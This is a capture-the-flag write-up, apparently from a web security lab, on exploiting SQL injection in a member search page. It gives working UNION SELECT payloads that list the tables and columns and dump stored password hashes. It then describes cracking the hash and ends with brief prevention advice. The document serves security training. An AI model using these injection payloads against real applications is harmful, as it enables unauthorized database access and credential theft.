# 02_unsecure_search_By_id_SQLINJECTION

# *How to find it*

Unsecure sql request form in the page: http://10.12.100.35/index.php?page=member

go to the page mentioned before, Whenever you are looking for an SQL injection you want to check if the page is injectable. 

You can type an SQL request responding true everytime such like this one:  '1 or 1=1' so it will return ALL rows from the "users" table.

Whenever we type this one we realise that this page can be injected. This is a major security problem.

we did these steps :

``` sql
 1 or 1=1 union select null,table_name from information_schema.tables
```
``` sql
 1 or 1=1 union select null,group_concat(column_name) from information_schema.columns where table_name=0x7573657273
```
- 0x7573657273 = users (hexadecimal)

```sql
 1 or 1=1 union select Commentaire,countersign from users
```

then decrypt it with md5 and hash to sha256.

the flag is : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5.

# *How should secure it*

- Using ORM (object relationnal mapping) because they use parametrized statements even though they can let you construct the sql statement.
- Sanitize input: Check that supplied fields like email addresses match a regular expression, ensure that numeric or alphanumeric fields do not contain symbol characters, 
  reject (or strip) out whitespace and new line characters where they are not appropriate

# *SRC*

https://www.hacksplaining.com/prevention/sql-injection